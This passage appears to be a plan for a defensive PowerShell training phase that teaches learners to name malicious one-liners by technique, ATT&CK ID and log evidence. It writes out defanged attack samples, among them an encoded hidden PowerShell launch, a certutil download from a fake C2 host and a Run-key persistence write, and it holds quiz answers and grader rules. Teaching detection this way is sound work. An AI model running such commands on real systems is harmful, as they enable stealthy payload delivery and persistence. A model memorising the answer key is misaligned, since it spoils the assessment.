2  powershell.exe -nop -w hidden -enc <base64-UTF16LE>                            # encoded — T1027/T1059.001 — cmdline + 4104(decoded)
3  certutil.exe -urlcache -split -f hxxps://fake-c2[.]test/p p                    # LOLBin download — T1105/T1218 — proc-create
4  Set-ItemProperty 'HKCU:\...\CurrentVersion\Run' -Name x -Value 'powershell -enc ...'  # persistence — T1547.001 — registry/4104
5  ConvertTo-SecureString 'PlainPw!' -AsPlainText -Force                          # cred exposure — T1552.001 — source/4104
```

**check.sh grades** (worksheet threshold; static; executes nothing):
- `assert_file_exists answers.md`, then a **set-e-safe ≥N-of-M threshold** over
  technique/ATT&CK/evidence keywords: `cradle|DownloadString`, `enc|encoded`, `certutil|LOLBin`,
  `Run|persist`, `SecureString|cred`, plus `T1059`, `T1027`, `T1105`, `T1547`, `T1552`, plus
  `4104` — require ≥8 of 11. (`answers.md` is stuffable → the quiz is the gate.)

**Quiz (3) — the gate:**
1. *(choice)* One-liner 1 (`iex(...DownloadString...)`) — technique + evidence? → **a
   download cradle (T1059.001/T1105); evidence is a 4104 ScriptBlock event**. *(distractor:
   "a LOLBin; evidence is a firewall log")*
2. *(choice)* One-liner 2's `powershell.exe -nop -w hidden -enc ...` — does encoding hide it
   from logging? → **No — the 4104 event records the decoded block; the command line + `-enc`
   are themselves signatures (T1027)**. *(distractor: "yes, logs see only base64")*
3. *(text)* One-liner 4 writes `HKCU:\...\Run` — technique + ATT&CK ID? → **autostart
   persistence, T1547.001**.

**Recap (3 lines):**
```
you can now read a malicious one-liner and name it: technique + ATT&CK ID + the log evidence it generates
cradle→4104, -enc→cmdline+4104(decoded), LOLBin→process-create, Run key→persistence, plaintext→cred exposure
every attack pattern has a detection artifact — Phase 5 (deobfuscation) is next, then reading real tools
```

**recall.json:** none on L4.9 (gate). **Build deliverable (step 6): draft L5.1's
`recall.json`** — 5 Qs from Phase 3 + 4, all `[VERIFY-AT-BUILD]`:
1. `source: ps L4.2` — `-EncodedCommand` is base64 of which encoding? → **UTF-16LE**.
2. `source: ps L4.5` — Which Event ID logs the decoded ScriptBlock? → **4104**.
3. `source: ps L4.1` — Why is `iex(DownloadString(...))` "fileless"? → **it runs in memory; nothing hits disk**.
4. `source: ps L3.1` — Which .NET type does base64 decoding? → **`[System.Convert]`**.
5. `source: ps L4.3` — Does AMSI see the decoded payload or only the encoded form? → **the decoded payload (runtime scan)**.

---

## 5. Build order, self-test, phase-close (Phase Builder protocol)

1. Scaffold `tracks/ps/phases/p4` (+ `phases.p4` in `track.json` if enumerated). Assumes
   Phases 0–3 built first.
2. Build **lab by lab in id order** (L4.1 → L4.9). Commit each after self-test: `ps <id>: <title>`.
3. **Self-test (no-fiction rule):** run each `lab.md` command in real pwsh 7 and paste REAL
   output for the **benign** probes (L4.2 decoder → `benign`; L4.5 event read). For
   `[WINDOWS-VARIANT]` labs (L4.3/L4.4/L4.6) the WSL2 self-test confirms the static-grade
   path; any Windows-only sample is labeled, never faked. Resolve every `[VERIFY-AT-BUILD]`
   (§7). Run `check.sh` twice (fail + pass).
4. **shellcheck-zero + lint:** each `check.sh` passes `tools/shellcheck-all.sh` +
   `tools/lint-labs.sh`. Most Phase-4 graders are **pwsh-free static** (L4.1, L4.3, L4.4,
   L4.6, L4.7, L4.8, L4.9); only L4.2 (benign decode) and L4.5 (event read) ship probe `.ps1`s.
5. **Safety self-check (build gate — hard stop if it fails):** grep the whole phase — **no**
   `check.sh` executes `iex`/`DownloadString`/`Invoke-WebRequest`/`Start-BitsTransfer`/`-enc`
   payload/`certutil`/`mshta`/`rundll32`/`regsvr32`; **no working AMSI/CLM bypass anywhere**;
   all decoded samples are harmless; all IOCs defanged + fictional; Empire/PowerSploit is
   structure-only.
6. **Gate:** L4.9 `gate:true`; `quiz_run` requires 3/3.
7. **Recall:** L4.1's `recall.json` ships now (`[VERIFY-AT-BUILD]` vs built Phase 2/3);
   L5.1's is drafted now (§4, L4.9).
8. **Close out:** update `planned_execution.md` (`ps p4` → done + evidence); tag `ps-p4`;
   report against the checklist.

**Phase Acceptance Checklist:** 9 labs, types match the map (5 AUDIT + 3 DECODE + 1 TOUR,
gate L4.9); the **safety self-check (step 5) passes**; `[WINDOWS-VARIANT]` labs (L4.3/4.4/4.6)
flagged and statically graded; benign decoders + shipped-event reads self-tested; shellcheck
+ lint clean; gate 3/3; L4.1 recall ships + L5.1 drafted; every finding carries its detection
evidence + ATT&CK ID; `planned_execution.md` updated; tagged `ps-p4`.

---

## 6. Verification summary (authoring pass — corrections pre-folded from ps-p01/2/3)

No pwsh executed this session. Carried-forward decisions:
- **Safety (§3a, §5 step 5):** nothing attacker-flavored runs; only benign cross-platform
  decoders (L4.2) and static-sample reads (L4.5) execute; no working AMSI/CLM bypass is ever
  shipped; all IOCs defanged/fictional; Empire/PowerSploit structure-only.
- **Windows-variant (§2):** AMSI (L4.3), CLM (L4.4), LOLBins (L4.6) flagged, statically
  graded, no Windows grading dependency.
- **Red/blue loop (§3c):** every attack pattern taught with its log evidence + ATT&CK ID;
  L4.5 (4104) is the SOC hinge, forward-referenced by the others.
- **Hygiene (§2b):** `.NET`/dotted literals via `assert_file_contains_fixed`; real
  `assert_output_contains` signature; free text via case/word-tolerant ERE.
- **Recall rule honored:** L4.1 recall from the curriculum's Phase 2/3 lab list
  (`[VERIFY-AT-BUILD]`), reconciled with ps-p3's L3.8 forward-draft.

**The build session must still run the per-lab adversarial correctness pass ps-p01 used**
and resolve §7 before shipping.

---

## 7. Open `[VERIFY-AT-BUILD]` items (confirm against real pwsh 7.4 at build)

| lab | item |
|---|---|
| L4.1 | cradle strings stay static/defanged; `check.sh` never fetches or `iex` |
| L4.2 | the benign UTF-16LE base64 blob decodes to `Write-Output 'benign'` (or chosen harmless string); decoder prints text, never runs it |
| L4.3 | AMSI content is behavioral/telemetry only — **no runnable bypass**; static grade holds on WSL2 |
| L4.4 | CLM restrictions list accurate (.NET/Add-Type/COM) + WDAC/AppLocker enforcement dependency; static grade |
| L4.5 | `event-4104.xml` is well-formed + defanged; `read4104.ps1` extracts `ScriptBlockText` cross-platform; nothing attacker-flavored runs |
| L4.6 | LOLBin one-liners static/defanged; parent→child detection tell accurate (Sysmon 1 / 4688) |
| L4.7 | `creds-sample.ps1` uses fictional creds; no probe runs `ConvertTo-SecureString`; audit-only grade |
| L4.8 | Empire/PowerSploit content is sanitized structure — no payload, no stager, nothing runnable |
| L4.9 | five one-liners static/defanged; ≥8-of-11 keyword threshold catches genuine technique/ATT&CK/evidence reads |

---

*Plan v1 (authored from curriculum §6 + the settled ps-p01/2/3 template) — awaiting review.
PLAN ONLY; nothing built, nothing committed.*
